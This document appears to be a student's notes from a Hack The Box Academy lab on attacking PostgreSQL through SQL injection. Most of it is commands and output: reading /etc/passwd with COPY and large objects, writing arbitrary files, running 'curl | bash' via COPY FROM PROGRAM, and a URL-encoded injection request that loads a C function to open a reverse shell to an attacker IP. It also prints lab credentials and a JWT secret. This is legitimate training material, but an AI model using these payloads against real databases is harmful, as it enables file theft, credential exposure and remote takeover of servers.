

## COPY FILES

```sql
bluebird=# CREATE TABLE tmp (t TEXT);
CREATE TABLE
bluebird=# COPY tmp FROM '/etc/passwd';
COPY 59
bluebird=# SELECT * FROM tmp LIMIT 5;
                        t                        
-------------------------------------------------
 root:x:0:0:root:/root:/usr/bin/zsh
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
 sys:x:3:3:sys:/dev:/usr/sbin/nologin
 sync:x:4:65534:sync:/bin:/bin/sync
(5 rows)

bluebird=# DROP TABLE tmp;
DROP TABLE
```

## Issues


One issue with using COPY to read files, is that it expects data to be seperated into columns. By default it treats \t as a column, so if you try to read a file like /etc/hosts you will run into this error:


```sql
bluebird=# COPY tmp FROM '/etc/hosts';
ERROR:  extra data after last expected column
CONTEXT:  COPY tmp, line 1: "127.0.0.1  localhost"




bluebird=# COPY tmp FROM '/etc/hosts' DELIMITER E'\x07';
COPY 7
bluebird=# SELECT * FROM tmp;
                             t                              
------------------------------------------------------------
 127.0.0.1       localhost
 127.0.1.1       kali
 
 # The following lines are desirable for IPv6 capable hosts
 ::1     localhost ip6-localhost ip6-loopback
 ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
(7 rows)
```


## Writing files

```sql
bluebird=# CREATE TABLE tmp (t TEXT);
CREATE TABLE
bluebird=# INSERT INTO tmp VALUES ('To hack, or not to hack, that is the question');
INSERT 0 1
bluebird=# COPY tmp TO '/tmp/proof.txt';
COPY 1
bluebird=# DROP TABLE tmp;
DROP TABLE
bluebird=# exit
```
```bash
0xevilpayload@htb[/htb]$ cat /tmp/proof.txt 
To hack, or not to hack, that is the question
```


## Permissions


```sql

bluebird=# SELECT current_setting('is_superuser');
 current_setting 
-----------------
 on
(1 row)
```

Checking if a user has a specific role is not so simple. Locally we could run \du, but through an injection we would need something like:


```sql
bluebird=# SELECT r.rolname, ARRAY(SELECT b.rolname FROM pg_catalog.pg_auth_members m JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid) WHERE m.member = r.oid) as memberof FROM pg_catalog.pg_roles r WHERE r.rolname='fileuser';
 rolname  |        memberof        
----------+------------------------
 fileuser | {pg_read_server_files}
(1 row)
```


# Large Objects

The second method for dealing with files is with large objects. This is a bit trickier than the COPY function, but at the same time it is a very powerful feature.


Reading Files
To read a file, we should first use lo_import to load the file into a new large object. This command should return the object ID of the large object which we will need to reference later on.


```sql
bluebird=# SELECT lo_import('/etc/passwd');
 lo_import 
-----------
     16513
(1 row)
```


Once the file is imported we should get an object ID. The file will be stored in the pg_largeobjects table as a hexstring. If the size of the file is larger than 2kb, the large object will be split up into pages each 2kb large (4096 characters when hex encoded). We can get the contents with lo_get(<object id>):



```sql
bluebird=# SELECT lo_get(16513);
<SNIP>\x726f6f743a783a303a303a726f6f743a2...<SNIP>
```


Alternatively, you can select data directly from pg_largeobject, but this requires specifying the page numbers as well:


```sql
bluebird=# SELECT data FROM pg_largeobject WHERE loid=16513 AND pageno=0;
bluebird=# SELECT data FROM pg_largeobject WHERE loid=16513 AND pageno=1;
<SNIP>
```



Once we've obtained the hexstring, we can convert it back using xxd like this:
```bash

0xevilpayload@htb[/htb]$ echo 726f6f743<SNIP> | xxd -r -p
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nolog
<SNIP>
```


Unfortunately, it's not possible to specify an object ID when creating the large object, so it does make things harder if you are doing this blindly. One thing you could do is select all object IDs from the pg_largeobject table and figure out which one is yours:


```sql
bluebird=# SELECT DISTINCT loid FROM pg_largeobject;
 loid  
-------
 16515
(1 row)
```


## Writing Files
Writing files using large objects is a very similar process. Essentially we will create a large object, insert hex-encoded data 2kb at a time and then export the large object to a file on disk.

First we need to prepare the file we want to upload by splitting it up into 2kb chunks:


```bash
0xevilpayload@htb[/htb]$ split -b 2048 /etc/passwd
0xevilpayload@htb[/htb]$ ls -l
total 8
-rw-r--r-- 1 kali kali 2048 Feb 25 06:52 xaa
-rw-r--r-- 1 kali kali 1328 Feb 25 06:52 xab
```


We'll convert each chunk (xaa,xab,...) into hex-strings like this:


```bash
0xevilpayload@htb[/htb]$ xxd -ps -c 99999999999 xaa
726f6f743a783a303a303a726<SNIP>
```


Once that's ready, we can create a large object with a known object ID with lo_create, then insert the hex-encoded data one page at a time into pg_largeobject, export the large object by object ID to a specific path with lo_export and then finally delete the object from the database with lo_unlink.



```bash

bluebird=# SELECT lo_create(31337);
 lo_create 
-----------
     31337
(1 row)

bluebird=# INSERT INTO pg_largeobject (loid, pageno, data) VALUES (31337, 0, DECODE('726f6f74<SNIP>6269','HEX'));
INSERT 0 1
bluebird=# INSERT INTO pg_largeobject (loid, pageno, data) VALUES (31337, 1, DECODE('6e2f626173<SNIP>96e0a','HEX'));
INSERT 0 1
bluebird=# SELECT lo_export(31337, '/tmp/passwd');
 lo_export 
-----------
         1
(1 row)

bluebird=# SELECT lo_unlink(31337);
 lo_unlink 
-----------
         1
(1 row)

bluebird=# exit

0xevilpayload@htb[/htb]$ head /tmp/passwd
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
```


Depending on user permissions, the INSERT queries may fail. In that case you could try using lo_put as it is described in the documentation:


```sql
bluebird=# SELECT lo_put(31337, 0, 'this is a test');
 lo_put 
--------
 
(1 row)
```


```properties
spring.datasource.url= jdbc:postgresql://localhost:5432/bluebird
spring.datasource.username= bbuser
spring.datasource.password= bbpassword

bluebird.app.jwtSecret= 72Ao88agtuOFT7PerfCtF80qzuyK1sEa
bluebird.app.jwtExpirationMs= 8640000
bluebird.app.jwtCookieName= auth
```


student:academy.hackthebox.com




Remote code execution using the create, copy and select clause

```sql
bluebird=# CREATE TABLE tmp(t TEXT);
CREATE TABLE
bluebird=# COPY tmp FROM PROGRAM 'id';
COPY 1
bluebird=# SELECT * FROM tmp;


create table tmp(t TEXT); copy tmp from PROGRAM 'curl http://10.10.15.101/index.html | bash';SELECT * FROM tmp;
```






for the remote execution code this is the payload 

first payload

```url
%' or 1=1
```


```sql
DROP FUNCTION IF EXISTS rev_shell;CREATE FUNCTION rev_shell(text, integer) RETURNS integer AS '/tmp/pg_rev_shell', 'rev_shell' LANGUAGE C STRICT;SELECT rev_shell('10.10.15.101', 443);
```




```post
GET /?q=%25'%20or%201%3d1%3bDROP%20FUNCTION%20IF%20EXISTS%20rev_shell%3bCREATE%20FUNCTION%20rev_shell(text%2c%20integer)%20RETURNS%20integer%20AS%20'%2ftmp%2fpg_rev_shell'%2c%20'rev_shell'%20LANGUAGE%20C%20STRICT%3bSELECT%20rev_shell('10.10.15.101'%2c%20443)-- HTTP/1.1
Host: 10.129.90.227:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Referer: http://10.129.90.227:8080/
Cookie: auth=eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJkaWNrZXIiLCJpYXQiOjE2OTQ2NzA2NzMsImV4cCI6MTY5NDY3OTMxM30.oz14fUbFzojwhXGAYhontXN12HljZCx9EedAwBeJu7pDaFUksus43Ctg2wCSu3MXmMdL2q8cJ2k8TXtf37O3ZA
Upgrade-Insecure-Requests: 1
```
